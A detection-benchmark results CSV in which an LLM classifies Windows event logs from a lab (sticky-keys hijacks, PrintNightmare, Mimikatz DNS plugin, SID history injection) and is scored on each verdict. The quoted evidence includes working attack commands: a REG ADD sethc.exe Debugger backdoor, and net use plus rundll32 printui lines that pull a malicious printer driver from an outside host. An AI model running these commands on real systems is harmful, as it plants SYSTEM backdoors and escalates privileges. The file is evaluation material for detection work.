# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
claude-opus-4-8,ID770-Success DLL loaded by DNS server.evtx,easy,A,processed,YES,100.0,100.0,YES,"771, 770",C:\TOOLS\Mimikatz-fev-2020\mimilib.dll,,,rootdc1.offsec.lan,,0.0,3.19,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 771, 770
- Processes: C:\TOOLS\Mimikatz-fev-2020\mimilib.dll
- Accounts: None
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
Event 770 shows the DNS Server loading a custom plugin DLL (mimilib.dll) from a Mimikatz tools directory on the domain controller rootdc1.offsec.lan. This is a known Mimikatz DNS server-level plugin abuse technique used for persistence and DNS query interception, which is malicious behavior rather than routine DNS operation."
claude-opus-4-8,ID4673-Privilege SeMachineAccountPrivilege called.evtx,easy,A,processed,NO,100.0,100.0,YES,4673,C:\Windows\System32\lsass.exe,hack1,,,,0.0,3.34,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4673
- Processes: C:\Windows\System32\lsass.exe
- Accounts: hack1
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
This single Event 4673 records a privileged service operation (SeMachineAccountPrivilege) invoked through lsass.exe, which is normal behavior for the Security Account Manager handling account management. In isolation, with no escalation chain, suspicious commands, or paired state changes, this represents routine privileged access logging rather than confirmed attack behavior."
claude-opus-4-8,ID4648-4624-RunAsCS login.evtx,easy,A,error,NO,0.0,0.0,NO,,,,,,,,45.81,,,,,,,"Error: Anthropic rejected the request - {'type': 'error', 'error': {'details': None, 'type': 'overloaded_error', 'message': 'Overloaded'}, 'request_id': 'req_011CbyvG7pokmkDcZqQsYXBS'}"
claude-opus-4-8,"ID4688,4624-RottenPotatoNG.evtx",easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4624","C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe","hack1, FS03VULN$, ANONYMOUS LOGON","MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff",127.0.0.1,,0.0,5.32,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4624
- Processes: C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe
- Accounts: hack1, FS03VULN$, ANONYMOUS LOGON
- Commands: MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff
- Network: 127.0.0.1
- Registry: None

EXPLANATION:
The sequence shows a clear privilege escalation attack: the security log was cleared (Event 1102) by user hack1, followed by execution of MSFRottenPotato.exe, a known token-impersonation exploit tool. This triggered an ANONYMOUS LOGON via NTLM V1 from 127.0.0.1 (Event 4624) leading to a cmd.exe shell spawned under the SYSTEM account (S-1-5-18 FS03VULN$), confirming successful escalation from a low-privileged user to SYSTEM."
claude-opus-4-8,"ID4688,4648,4624-Runas execution with different user.evtx",easy,A,processed,YES,100.0,81.7,YES,"1102, 4688, 4648, 4624, 4672","C:\Windows\System32\runas.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe","admmig, hack1, FS03$","runas  /user:offsec\hack1 cmd.exe, cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe",::1,,0.0,6.24,4.9,6.0,4.0,4,18.9,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4648, 4624, 4672
- Processes: C:\Windows\System32\runas.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe
- Accounts: admmig, hack1, FS03$
- Commands: runas  /user:offsec\hack1 cmd.exe, cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe
- Network: ::1
- Registry: None

EXPLANATION:
The sequence begins with a security log clear (Event 1102) by admmig, a classic anti-forensic/defense-evasion action, immediately followed by a runas to switch context to the hack1 account and spawn cmd.exe. The new hack1 session is granted highly sensitive privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeImpersonatePrivilege per Event 4672), indicating privilege escalation. The combination of log clearing followed by privileged credential switching and process execution under a suspiciously named account (""hack1"") strongly indicates malicious activity."
claude-opus-4-8,ID4704-4705-User righ assigned to account.evtx,easy,A,processed,YES,100.0,100.0,YES,"4704, 4705",,admmig,,,,0.0,5.39,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4704, 4705
- Processes: None
- Accounts: admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The same actor (admmig, LogonId 0x202DAC8) repeatedly assigns and then removes a series of sensitive privileges (SeCreateTokenPrivilege, SeAssignPrimaryTokenPrivilege, SeDebugPrivilege, SeImpersonatePrivilege) to target SID -1158 over a short window. This rapid assign/remove cycling of token-manipulation and debug privileges is a classic privilege-escalation/token-abuse pattern rather than routine administration, and the targeting of a single account with these specific high-risk rights is a strong attack signal."
claude-opus-4-8,ID4717-4718-System security granded to account.evtx,easy,A,processed,NO,100.0,100.0,YES,"4717, 4718",,admmig,,,,0.0,4.26,6.0,2.0,4.0,4,16.0,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4717, 4718
- Processes: None
- Accounts: admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
These paired events show the same actor (admmig) granting (4717) then removing (4718) the SeDenyServiceLogonRight on the same target SID within seconds, which is consistent with routine account/policy migration administration. The right being modified is a ""deny"" logon right rather than an escalation of privileges, and the symmetric grant/remove pattern reflects normal user-rights assignment maintenance rather than an attack."
claude-opus-4-8,ID 4765 - SID history added.evtx,easy,A,processed,YES,100.0,75.0,YES,"4661, 4765, 4658",C:\Windows\System32\lsass.exe,"Administrator, Andrei, maincorp.local\Domain Admins",,,,0.0,4.44,4.5,5.0,4.0,3,16.5,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4661, 4765, 4658
- Processes: C:\Windows\System32\lsass.exe
- Accounts: Administrator, Andrei, maincorp.local\Domain Admins
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
Event 4765 records that SID History was added to account ""Andrei"" (RID 1104), linking it to the ""Domain Admins"" group SID (RID 512), performed by the Administrator account. SID History injection is a known privilege-escalation/persistence technique that grants a low-privileged account hidden Domain Admin rights, and the surrounding SAM_DOMAIN object access (4661/4658) confirms direct manipulation of the directory database via lsass.exe."
claude-opus-4-8,ID 4865 4706 - trust added.evtx,easy,A,processed,YES,100.0,100.0,YES,"4741, 4742, 4706, 4865",,"ROOTBLUE$, Administrator, MYPARTNER, CHILD, ROOTBLUE",,"CDCWTRDC01.mypartner.lan, rootblue.lan, child.rootblue.lan",,0.0,5.95,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4741, 4742, 4706, 4865, 4865, 4865
- Processes: None
- Accounts: ROOTBLUE$, Administrator, MYPARTNER, CHILD, ROOTBLUE
- Commands: None
- Network: CDCWTRDC01.mypartner.lan, rootblue.lan, child.rootblue.lan
- Registry: None

EXPLANATION:
A new cross-forest trust (Event 4706) was created to rootblue.lan with SID filtering state indicated, followed immediately by forest trust namespace entries (Event 4865) adding child.rootblue.lan and the ROOTBLUE forest top-level names. The creation of a new inbound/cross-forest trust combined with the addition of SID-filtering-exempt namespace entries is a classic SID-history / cross-forest abuse pattern enabling privilege escalation between domains. This rapid sequence by a single Administrator account, paired with the ROOTBLUE$ computer account UAC changes, is consistent with malicious trust manipulation rather than routine administration."
claude-opus-4-8,ID5136-4662 sensitive GPO edited.evtx,easy,A,processed,YES,100.0,43.8,YES,"4662, 5136",,"admmig, FS02$, ROOTDC1$",,,,0.0,5.91,2.6,2.0,4.0,4,12.6,C,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4662, 5136
- Processes: None
- Accounts: admmig, FS02$, ROOTDC1$
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The admmig account modified a groupPolicyContainer object (CN={127328D6-A8A8-49E3-BA71-410C945F42CE},CN=POLICIES,CN=SYSTEM,DC=OFFSEC,DC=LAN) on a domain controller, incrementing the GPO versionNumber from 1 to 2, indicating GPO tampering. The preceding 4662 directory access and subsequent repeated directory object access events by FS02$ and ROOTDC1$ against the same object types are consistent with a GPO-based attack/persistence chain rather than routine administration."
claude-opus-4-8,ID1-CMD executed via sticky key call.evtx,easy,A,processed,YES,100.0,100.0,YES,"1, 18","C:\Windows\System32\cmd.exe, C:\Windows\System32\winlogon.exe, C:\Windows\system32\mmc.exe",OFFSEC\admmig,C:\windows\system32\cmd.exe sethc.exe 211,,,0.0,6.55,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1, 18
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\winlogon.exe, C:\Windows\system32\mmc.exe
- Accounts: OFFSEC\admmig
- Commands: C:\windows\system32\cmd.exe sethc.exe 211
- Network: None
- Registry: None

EXPLANATION:
The command line references sethc.exe (the Sticky Keys binary) spawned in a context tied to winlogon.exe, a classic accessibility-feature debugger/replacement abuse pattern (T1546.008) used to gain SYSTEM-level command execution at the logon screen. The parent process winlogon.exe launching cmd.exe with a sethc.exe argument strongly indicates a Sticky Keys backdoor manipulation rather than benign activity. The subsequent mmc.exe named-pipe connection to \srvsvc suggests follow-on network/system discovery activity."
claude-opus-4-8,ID11-New sethc file created from CMD copy.evtx,easy,A,processed,YES,100.0,100.0,YES,11,"C:\Windows\system32\cmd.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,,0.0,4.51,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 11, 11
- Processes: C:\Windows\system32\cmd.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- Accounts: None
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The events show file creation/modification of C:\Windows\System32\sethc.exe (Sticky Keys) and a related seth2c.exe binary on a file server, performed by cmd.exe and powershell.exe. Tampering with sethc.exe is a classic ""sticky keys"" backdoor/persistence and privilege-escalation technique allowing accessibility-key code execution at the logon screen. The combination of modifying a system accessibility binary using interactive shells is strongly indicative of malicious activity."
claude-opus-4-8,"ID12,13-Stickey key registry update.evtx",easy,A,processed,YES,100.0,91.7,YES,"12, 13","C:\Windows\system32\reg.exe, C:\windows\system32\cmd.exe",,,,"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe, HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger",0.0,5.06,5.5,6.0,4.0,4,19.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 12, 13
- Processes: C:\Windows\system32\reg.exe, C:\windows\system32\cmd.exe
- Accounts: None
- Commands: None
- Network: None
- Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe, HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger

EXPLANATION:
The same process (reg.exe, PID 4932) created an Image File Execution Options key for sethc.exe and then set its Debugger value to cmd.exe. This is the classic ""sticky keys"" debugger hijack (T1183/accessibility feature abuse), allowing an attacker to launch a SYSTEM command prompt from the logon screen, which is a well-known persistence and privilege-escalation backdoor."
claude-opus-4-8,ID4656-Failed sethc replacement by CMD.evtx,easy,A,processed,YES,100.0,75.0,YES,"1102, 4656","C:\Windows\System32\cmd.exe, C:\Windows\System32\sethc.exe",admmig,,,,0.0,4.87,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4656
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\sethc.exe
- Accounts: admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The Security log was cleared (Event 1102) by account admmig, immediately followed by repeated handle-request access (Event 4656) to C:\Windows\System32\sethc.exe with write/modify rights via cmd.exe. This sequence — log clearing for defense evasion plus write access to sethc.exe — is the classic ""sticky keys"" accessibility backdoor pattern used to establish persistence and bypass authentication. The combination of anti-forensic log clearing and tampering with a known abuse binary strongly indicates malicious activity."
claude-opus-4-8,ID4688-Stickey command reg update + execution.evtx,easy,A,processed,YES,100.0,85.0,YES,4688,"reg.exe, cmd.exe, conhost.exe, cscript.exe, winlogon.exe, MonitoringHost.exe","admmig, SRVDEFENDER01$","REG  ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /t REG_SZ /v Debugger /d ""C:\windows\system32\cmd.exe"" /f, C:\windows\system32\cmd.exe sethc.exe 211, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""",,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe,0.0,6.08,5.1,6.0,4.0,4,19.1,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: reg.exe, cmd.exe, conhost.exe, cscript.exe, winlogon.exe, MonitoringHost.exe
- Accounts: admmig, SRVDEFENDER01$
- Commands: REG  ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /t REG_SZ /v Debugger /d ""C:\windows\system32\cmd.exe"" /f, C:\windows\system32\cmd.exe sethc.exe 211, ""C:\Windows\system32\cscript.exe"" /nologo ""MonitorKnowledgeDiscovery.vbs""
- Network: None
- Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe

EXPLANATION:
This is a classic ""sticky keys"" backdoor attack: the account admmig set a Debugger value under the Image File Execution Options key for sethc.exe pointing to cmd.exe, which yields a SYSTEM shell when sticky keys (sethc.exe) is triggered. The subsequent event shows winlogon.exe spawning cmd.exe via sethc.exe under the SYSTEM context, confirming the persistence/privilege-escalation backdoor was successfully invoked."
claude-opus-4-8,1-Print spool spawned a CMD shell (PrintNightMare).evtx,easy,A,processed,YES,100.0,100.0,YES,1,"cmd.exe, spoolsv.exe",NT AUTHORITY\SYSTEM,"""cmd.exe""",,,0.0,3.95,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1
- Processes: cmd.exe, spoolsv.exe
- Accounts: NT AUTHORITY\SYSTEM
- Commands: ""cmd.exe""
- Network: None
- Registry: None

EXPLANATION:
The print spooler service (spoolsv.exe) spawning cmd.exe as NT AUTHORITY\SYSTEM at System integrity level is a classic indicator of a PrintNightmare-style or print spooler exploitation leading to privilege escalation. Legitimate spoolsv.exe activity does not normally launch an interactive command processor, and the RuleName tagging T1059 (Command-Line Interface) on this parent-child chain strongly suggests malicious exploitation."
claude-opus-4-8,"ID316,300,301,316,823,848-Mimispool printer server instal.evtx",easy,A,processed,YES,100.0,50.0,YES,"823, 302, 849, 301, 316, 848, 300","spoolsv.exe, winspool.drv",,,fs03vuln.offsec.lan,,0.0,5.50,3.0,6.0,4.0,3,16.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 823, 302, 849, 301, 316, 848, 300
- Processes: spoolsv.exe, winspool.drv
- Accounts: None
- Commands: None
- Network: fs03vuln.offsec.lan
- Registry: None

EXPLANATION:
The repeated creation, sharing, and deletion of a printer named ""Kiwi Legit Printer"" along with a ""Generic / Text Only"" driver addition (UNIDRV.DLL) on a host named fs03vuln matches the behavior of the PrintNightmare / Mimikatz ""misc::printnightmare"" exploit, which abuses the print spooler to load attacker-controlled drivers. The suspiciously named printer (""Legit"") and the rapid add/share/delete cycle via spoolsv.exe are strong indicators of spooler abuse rather than routine printer management. This pattern of paired driver installation and printer state changes is consistent with privilege escalation via the Windows Print Spooler service."
claude-opus-4-8,ID354-808-Mimispool printer installation (PrintNightmare).evtx,easy,A,processed,YES,100.0,100.0,YES,"316, 300, 304, 306, 354, 823, 808, 302, 301, 317",spoolsv.exe,,,"\\fs03vuln\Kiwi Legit Printer, \\fs03vuln\print$\W32X86\3\mimispool.dll","None
- Files: C:\Windows\system32\spool\DRIVERS\x64\3mimispool.dll, mimispool.dll",16.7,7.25,6.0,6.0,3.3,3,18.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 316, 300, 304, 306, 354, 823, 808, 302, 301, 317
- Processes: spoolsv.exe
- Accounts: None
- Commands: None
- Network: \\fs03vuln\Kiwi Legit Printer, \\fs03vuln\print$\W32X86\3\mimispool.dll
- Registry: None
- Files: C:\Windows\system32\spool\DRIVERS\x64\3mimispool.dll, mimispool.dll

EXPLANATION:
This sequence shows the classic PrintNightmare / Mimikatz ""Kiwi Legit Printer"" exploitation pattern: a printer driver is added, a malicious DLL (mimispool.dll) is loaded via the print spooler, and the loadplugin/init failures reference mimispool.dll being pulled from a remote print$ share (\\fs03vuln). The references to ""Kiwi"" (Mimikatz author signature), the spooler loading an arbitrary DLL, and the rapid create-then-delete of the printer/driver to cover tracks are strong indicators of malicious spooler abuse rather than routine printer installation."
claude-opus-4-8,"ID4688,6416,4648-SystemNightMare.evtx",easy,A,processed,YES,100.0,83.8,YES,"1102, 4688, 4648, 4690, 4658, 4656, 6416","net.exe, rundll32.exe, cmd.exe, spoolsv.exe, drvinst.exe, svchost.exe, conhost.exe","admmig, OFFSEC, FS01$, gentilguest","net  use \\printnightmare.gentilkiwi.com\ipc$ /user:gentilguest password, rundll32  printui.dll,PrintUIEntry /in /n""\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"", ""cmd.exe""","printnightmare.gentilkiwi.com, 20.188.56.147","\REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates, \REGISTRY\MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates, \REGISTRY\MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates",0.0,8.29,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4648, 4690, 4658, 4656, 6416
- Processes: net.exe, rundll32.exe, cmd.exe, spoolsv.exe, drvinst.exe, svchost.exe, conhost.exe, DrvInst.exe
- Accounts: admmig, OFFSEC, FS01$, gentilguest
- Commands: net  use \\printnightmare.gentilkiwi.com\ipc$ /user:gentilguest password, rundll32  printui.dll,PrintUIEntry /in /n""\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"", ""cmd.exe""
- Network: printnightmare.gentilkiwi.com, 20.188.56.147
- Registry: \REGISTRY\MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates, \REGISTRY\MACHINE\SOFTWARE\Policies\Microsoft\SystemCertificates\Root\Certificates, \REGISTRY\MACHINE\SOFTWARE\Microsoft\EnterpriseCertificates\Root\Certificates

EXPLANATION:
This is a PrintNightmare (CVE-2021-34527) exploitation: a remote malicious printer ""Kiwi Legit Printer"" is installed via rundll32 printui.dll from printnightmare.gentilkiwi.com, causing spoolsv.exe to load an attacker-supplied driver and spawn an elevated SYSTEM cmd.exe (spoolsv.exe as parent, S-1-16-16384 SYSTEM integrity). The Security log was cleared (Event 1102) immediately before the attack to hinder forensic analysis, confirming malicious intent."
